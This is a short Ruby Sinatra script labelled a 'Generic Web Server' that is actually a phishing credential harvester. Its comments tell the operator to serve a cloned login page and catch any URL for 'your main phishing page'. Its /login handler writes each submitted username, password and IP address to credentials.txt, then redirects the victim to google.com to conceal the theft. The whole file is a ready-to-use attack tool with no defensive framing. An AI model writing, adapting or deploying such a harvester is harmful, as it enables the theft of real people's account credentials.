#!/usr/bin/env ruby
# Generic Web Server
# Requirements:
#   gem install sinatra rerun
#   apt-get install build-essential libsqlite3-dev
#   rerun 'ruby login.rb'
#
require 'bundler/inline'

begin
  require 'sinatra'
  require 'logger'
rescue Exception => e
  gemfile do
    source 'https://rubygems.org'
    gem 'sinatra', require: 'sinatra'
  end
end

file = 'credentials.txt'
logger = Logger.new(file)
logger.formatter = proc do |severity, datetime, progname, msg|
  "#{datetime.strftime('%Y-%m-%d %H:%M')} | #{msg}\n"
end

configure {
  set :port, 8181
  set :environment, :production
  set :root, File.dirname(__FILE__)
  set :public_folder, Proc.new { File.join(root, '/views') }
  set :show_exceptions, false
}
enable :sessions

# Put your cloned website under 'views' directory
# To accept any fake URL to your main phishing page add asterisk (*) after the route
# example:
#   get '/*' do
#     # code
#   end
get '/' do
  erb 'PATH/TO/LOGIN_PAGE'.to_sym
end


post '/login' do
  if params['UserName'] && params['Password']   # Find the parameter's input id from your cloned website
    username = params['UserName']
    password = params['Password']
    ip_addr  = @env['HTTP_X_REAL_IP']           # request.env['REMOTE_ADDR'].split(',').first
    logger.info(username.to_s + ':' + password.to_s + ':' + ip_addr.to_s)
    redirect 'https://google.com'               # Redirect user to google After submitting the form
  else
    erb '/'.to_sym
  end
end

not_found do
  redirect '/'.to_sym
end
